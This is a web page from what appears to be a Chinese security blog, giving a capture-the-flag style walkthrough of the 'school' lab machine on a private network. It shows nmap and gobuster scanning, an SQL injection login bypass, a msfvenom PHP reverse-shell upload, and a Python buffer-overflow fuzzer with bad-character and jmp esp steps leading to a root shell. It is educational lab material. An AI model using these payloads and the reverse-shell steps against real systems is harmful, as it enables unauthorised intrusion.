@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="author" content="magisec网络安全博客" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  
+  <title>school   | magisec网络安全博客</title>
+
+  
+    <link rel="apple-touch-icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
+    <link rel="icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Dmagic</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">school</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2020-12-25
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机：192.168.56.105</p>
+<p>靶机：192.168.56.121</p>
+<p>这篇文章写的不是特别好，如果缓冲区没有看懂的，可以私信我，我会为你解答。QQ：2933653699</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oN school.nmap 192.168.56.121</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5429e0a998" alt="image-20201224201910918"></p>
+<p>开放 22 23 80</p>
+<p>22 ssh</p>
+<p>23 未知 nmap猜测是telnet，自己测试使用telnet无法连接。</p>
+<p>80 web</p>
+<p>渗透思路：通过80端口getshell，反弹shell回来进行提权。</p>
+<h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.121</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe542a3c7de8" alt="image-20201224202505086"></p>
+<p>gobuster扫描目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.121 -o dir.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe542a950877" alt="image-20201224203002654"></p>
+<p>没有啥结果，我们扫一下student_attendance</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.121&#x2F;student_attendance&#x2F; -o dir.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe542aec8713" alt="image-20201224203153421"></p>
+<p>查看database目录</p>
+<p><img src="https://img.rruu.net/image/5fe542b43bba5" alt="image-20201224203218267"></p>
+<p>将文件下载下来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.121&#x2F;student_attendance&#x2F;database&#x2F;student_attendance_db.sql</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe542baf2edb" alt="image-20201224203255258"></p>
+<p>发现一个用户名</p>
+<p><img src="https://img.rruu.net/image/5fe542c01d1a5" alt="image-20201224203516697"></p>
+<p>没有任何价值，尝试登录失败。看来数据库文件没有啥用，我们尝试对网站进行漏洞攻击。</p>
+<h3 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h3><p>手工使用万能密码进行检测，存在注入漏洞，我们可以直接进入系统。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe542c573099" alt="image-20201224203631417"></p>
+<h2 id="网站后台getshell"><a href="#网站后台getshell" class="headerlink" title="网站后台getshell"></a>网站后台getshell</h2><p>简单查看，未发现上传点。右键源代码，发现上传点。</p>
+<p><img src="https://img.rruu.net/image/5fe542ca33d36" alt="image-20201224204029049"></p>
+<p>msf生成phpshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
+<p>上传到网站上</p>
+<p><img src="https://img.rruu.net/image/5fe542cf4ecff" alt="image-20201224234057152"></p>
+<p>直接上传，他会自己运行的。返回了shell</p>
+<p><img src="https://img.rruu.net/image/5fe542d4752cf" alt="image-20201224234144634"></p>
+<p>拿到第一个flag</p>
+<p><img src="https://img.rruu.net/image/5fe542da2ac06" alt="image-20201224234229326"></p>
+<h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>查找网站配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat db_connect.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe542df6dd9e" alt="image-20201224234506919"></p>
+<p>尝试ssh su切换用户均失败</p>
+<p><img src="https://img.rruu.net/image/5fe542e4b00ab" alt="image-20201224234909519"></p>
+<p>尝试suid提权失败</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe542ea8c710" alt="image-20201224235154430"></p>
+<p>目前来说，提权是不太可能提权的，我们继续做信息收集。前往root目录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe542f009c8c" alt="image-20201224235309605"></p>
+<p>没有权限，但是我们发现了win文件，很奇怪，我们去看看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat win</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe542f7223c9" alt="image-20201224235403168"></p>
+<p>使用wine去运行exe文件，以root权限，我们下载下来到windows上分析一下该exe。</p>
+<p><img src="https://img.rruu.net/image/5fe542fc442e0" alt="image-20201224235505559"></p>
+<h3 id="审计exe文件"><a href="#审计exe文件" class="headerlink" title="审计exe文件"></a>审计exe文件</h3><p>这个文件是这样的，他会开启这个23端口，然后接受23端口输出。我们尝试缓冲区溢出。使用python编写fuzz缓冲区最大值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import socket,time</span><br><span class="line"></span><br><span class="line">num &#x3D; 5</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        buffer &#x3D; b&quot;A&quot; * num</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((&quot;192.168.132.144&quot;,23))</span><br><span class="line">        s.send((buffer))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.close()</span><br><span class="line">        time.sleep(0.05)</span><br><span class="line">        print(&quot;[*]Payload is %i As&quot; % (num))</span><br><span class="line">        num +&#x3D; 5</span><br><span class="line">except:</span><br><span class="line">    print(&quot;[*]Payload is %i As&quot; % (num-5))</span><br></pre></td></tr></table></figure>
+<p>确定缓冲区准确值为1900。</p>
+<p><img src="https://img.rruu.net/image/5fe543017bc8d" alt="image-20201225000620036"></p>
+<h3 id="缓冲区溢出exp编写"><a href="#缓冲区溢出exp编写" class="headerlink" title="缓冲区溢出exp编写"></a>缓冲区溢出exp编写</h3><p>我们使用x32dbg调试程序，进一步利用。</p>
+<p><img src="https://img.rruu.net/image/5fe5430668937" alt="image-20201225001045022"></p>
+<p>直接运行，发现dbg的寄存器发生变化，全部是424242 就是 BBB。</p>
+<p><img src="https://img.rruu.net/image/5fe5430ae9df4" alt="image-20201225001126986"></p>
+<p>如果需要进一步利用，需要过滤坏的字符串，我们使用python生成字符fuzz列表。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;for i in range(1,256): print(&#39;\\x%02x&#39; % i, end&#x3D;&#39;&#39;)&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54310654a3" alt="image-20201225001605820"></p>
+<p>复制到测试文件中</p>
+<p><img src="https://img.rruu.net/image/5fe54314b00e2" alt="image-20201225001710190"></p>
+<p>发现b0为坏字符，即/x4c后面的字符为坏字符，我们去除掉，然后重复此步骤。</p>
+<p><img src="https://img.rruu.net/image/5fe543196a514" alt="image-20201225001804892"></p>
+<p>重复测试，发现4e后面的字符为坏字符，去掉，重新测试一遍。</p>
+<p><img src="https://img.rruu.net/image/5fe5431dd0472" alt="image-20201225002000692"></p>
+<p>发现5e后面的字符为坏字符我们去掉重复测试。</p>
+<p><img src="https://img.rruu.net/image/5fe543239954b" alt="image-20201225002050017"></p>
+<p>最后得出，坏字符为，\x00这个字符别用，本身就是坏字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x4d\x4f\x5f\x79\x7e\x7f</span><br></pre></td></tr></table></figure>
+<p>接下来，我们来查找jmp esp （栈指针寄存器）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">625012DD</span><br></pre></td></tr></table></figure>
+<p>最终利用exp如下：</p>
+<p><img src="https://img.rruu.net/image/5fe5432842108" alt="image-20201225003739440"></p>
+<p>我们使用msf生成shellcode代码，使用-b参数去除坏字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;messagebox TEXT&#x3D;&quot;hello magisec&quot; -f c -b &quot;\x00\x4d\x4f\x5f\x79\x7e\x7f&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5432cb4e81" alt="image-20201225004044656"></p>
+<p>处理shellcode，如下：</p>
+<p><img src="https://img.rruu.net/image/5fe543340b862" alt="image-20201225004939721"></p>
+<p>使用python3运行</p>
+<p><img src="https://img.rruu.net/image/5fe5433871d52" alt="image-20201225004954365">、</p>
+<p>运行完成，出现弹窗，已经执行shellcode了。</p>
+<p><img src="https://img.rruu.net/image/5fe5433cb0684" alt="image-20201225005032954"></p>
+<h3 id="利用缓冲区溢出反弹root权限shell"><a href="#利用缓冲区溢出反弹root权限shell" class="headerlink" title="利用缓冲区溢出反弹root权限shell"></a>利用缓冲区溢出反弹root权限shell</h3><p>切回kali，配置监听。生成shellcode代码。</p>
+<p><img src="https://img.rruu.net/image/5fe54341554a0" alt="image-20201225005935314"></p>
+<p>我们在linux反弹一个shell回来，python代码如下：</p>
+<p><img src="https://img.rruu.net/image/5fe543468813a" alt="image-20201225005848610"></p>
+<p><img src="https://img.rruu.net/image/5fe5434b7ca25" alt="image-20201225010054043"></p>
+<p>成功返回shell，读取flag文件。</p>
+<p><img src="https://img.rruu.net/image/5fe543518507b" alt="image-20201225010211123"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2020/12/24/linux_suid_cp%E6%8F%90%E6%9D%83/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2020-12-25
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2020/12/25/Linux%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF%E5%90%88%E9%9B%86/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E6%89%AB%E6%8F%8F"><span class="toc-text">Nmap扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">80端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-text">SQL注入攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0getshell"><span class="toc-text">网站后台getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1exe%E6%96%87%E4%BB%B6"><span class="toc-text">审计exe文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BAexp%E7%BC%96%E5%86%99"><span class="toc-text">缓冲区溢出exp编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8F%8D%E5%BC%B9root%E6%9D%83%E9%99%90shell"><span class="toc-text">利用缓冲区溢出反弹root权限shell</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/magisec/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="2933653699@qq.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="Dmagic_hk">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      <a href="">Copyright © magisec 2021</a>
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
